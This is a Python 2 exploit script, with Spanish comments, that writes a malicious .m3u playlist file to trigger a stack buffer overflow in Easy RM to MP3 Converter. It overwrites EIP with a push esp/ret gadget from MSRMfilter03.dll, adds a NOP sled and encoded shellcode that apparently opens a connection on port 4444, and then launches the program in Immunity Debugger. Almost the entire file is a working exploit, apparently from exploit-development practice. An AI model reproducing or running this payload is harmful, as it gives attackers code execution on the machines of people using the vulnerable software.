import os,subprocess,struct

# verificar si sale(conexion 4444) con: netstat -an 

buf =  (
    "\xba\x23\x98\xa6\xa8\xda\xc4\xd9\x74\x24\xf4\x5e"
    "\x33\xc9\xb1\x57\x31\x56\x15\x03\x56\x15\x83\xc6"
    "\x04\xe2\xd6\x64\x4e\x27\x18\x95\x8f\x58\x91\x70"
    "\xbe\x4a\xc5\xf1\x93\x5a\x8e\x54\x18\x10\xc2\x4c"
    "\x2f\x91\xa8\x4a\x1e\x22\xa7\xe1\x48\xed\x77\xa9"
    "\xb5\x6c\x0b\xb0\xe9\x4e\x32\x7b\xfc\x8f\x73\xcd"
    "\x8a\x60\x29\x99\xff\x2d\xdd\xae\x42\xee\xdc\x60"
    "\xc9\x4e\xa6\x05\x0e\x3a\x1a\x07\x5f\x48\xea\x1f"
    "\xd4\x17\xca\x4f\xeb\x74\x8f\xb9\x9f\x46\xc6\xb2"
    "\x54\x3c\xd9\x12\xa5\xbd\xe8\x5a\x07\x8e\x07\xf7"
    "\x89\xd6\x2f\xe7\xff\x2c\x4c\x9a\x07\xf7\x2f\x40"
    "\x8d\xe8\x97\x03\x35\xcd\x26\xc7\xa0\x86\x24\xac"
    "\xa7\xc1\x28\x33\x6b\x7a\x54\xb8\x8a\xad\xdd\xfa"
    "\xa8\x69\x86\x59\xd0\x28\x62\x0f\xed\x2b\xca\xf0"
    "\x4b\x27\xf8\xe7\xec\xc8\x03\x08\xb1\x5e\xc8\xc5"
    "\x4a\x9f\x46\x5d\x38\xad\xc9\xf5\xd6\x9d\x82\xd3"
    "\x21\xe1\xb9\xa4\xbe\x1c\x41\xd5\x97\xda\x15\x85"
    "\x8f\xcb\x15\x4e\x50\xf3\xc0\xfb\x5b\x52\xba\x19"
    "\xa6\x0e\x3b\xb4\x5b\xa7\xd1\x47\x83\xd7\xda\x8d"
    "\xac\x70\x26\x2e\xc2\xdc\xaf\xc8\x8e\xcc\xf9\x43"
    "\x27\x2f\xde\x5b\xd0\x50\x35\x26\xde\xa0\x30\x71"
    "\xdf\xbe\x3a\xd5\xb7\x09\xd3\xe1\xb8\x89\xf6\x45"
    "\x2f\x02\x14\x52\x4e\x15\x31\xf2\x07\x82\xcc\x93"
    "\x6a\x32\xd1\xb9\x1f\xb4\x47\x46\xb6\xe3\xff\x44"
    "\xef\xc4\xa0\xb7\xda\x56\xa6\x48\x9b\x75\xdd\x7f"
    "\x09\xc6\x89\x7f\xdd\xc6\x49\xd6\xb7\xc6\x21\x8e"
    "\xe3\x94\x54\xd1\x39\x89\xc5\x44\xc2\xf8\xba\xcf"
    "\xaa\x06\xe5\x38\x75\xf8\xc0\x3a\x72\x06\x94\x3b"
    "\x82\xc4\x41\x82\xf1\x23\x52\xb1\x1a\xae\x7e\xcc"
    "\xb2\x77\xeb\x6d\xdf\x87\xc6\xb2\xe6\x0b\xe2\x4a"
    "\x1d\x13\x87\x4f\x59\x93\x74\x22\xf2\x76\x7a\x91"
    "\xf3\x52"
)


fileName = "exploit.m3u"
f = open(fileName,"wb")

junk = "A" * 26092

# 0x1001b058 : push esp # ret  |  {PAGE_EXECUTE_READ} [MSRMfilter03.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Archivos de programa\Easy RM to MP3 Converter\MSRMfilter03.dll)
eip = "\x58\xb0\x01\x10"
junk += eip

# Al hacer PUSH ESP + RET, el procesador cae justo despues del EIP.
# Necesitamos estos NOPs para que no se "coma" las primeras letras del shellcode.
junk += "\x90" * 400

# 2 Ajuste de Pila: ADD ESP, -4000 (\x81\xc4\x5c\xef\xff\xff)
# Esto mueve el ESP lejos del shellcode para que no se sobrescriba a si mismo
# stack_adj = "\x81\xc4\x5c\xef\xff\xff"
# junk += stack_adj


junk += buf

junk += "C" *  (30000 - len(junk))


f.write(junk)
f.close()

print "exploit created successfully"

debuggercmd = "C:\\Archivos de programa\\Immunity Inc\\Immunity Debugger\\ImmunityDebugger.exe"
cmd = "C:\\Archivos de programa\\Easy RM to MP3 Converter\\RM2MP3Converter.exe"
subprocess.call([debuggercmd, cmd])